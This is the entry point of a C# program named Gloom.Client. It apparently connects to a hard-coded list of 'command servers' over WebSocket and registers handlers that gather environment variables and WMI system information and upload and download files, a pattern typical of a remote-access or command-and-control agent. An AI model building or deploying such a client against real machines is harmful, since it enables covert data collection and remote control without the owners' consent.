
using Gloom.Client.Features.FileIO;
using Gloom.Client.Features.InfoCollector;
using Gloom.Client.Features.InfoCollector.Wmi;

namespace Gloom.Client
{
	internal class Program
	{
		private static readonly string[] CommandServers = new string[]
		{
			//"ws://192.168.0.94:8683",
			//"ws://10.0.2.15:8683",
			//"ws://127.0.0.1:8683",
			"ws://192.168.0.43:8683" // Connection succeed on here
		};

		static void Main(string[] args)
		{
			SimpleParallel.ForEach(CommandServers, async addr =>
			{
				var client = new MessageClient(new Uri(addr));
				client.RegisterHandler(new EnvVarsCollector(client));
				client.RegisterHandler(new WmiInfoCollector(client));
				client.RegisterHandler(new FileUploader(client));
				client.RegisterHandler(new FileDownloader(client));
				await client.Run();
			});
		}
	}
}
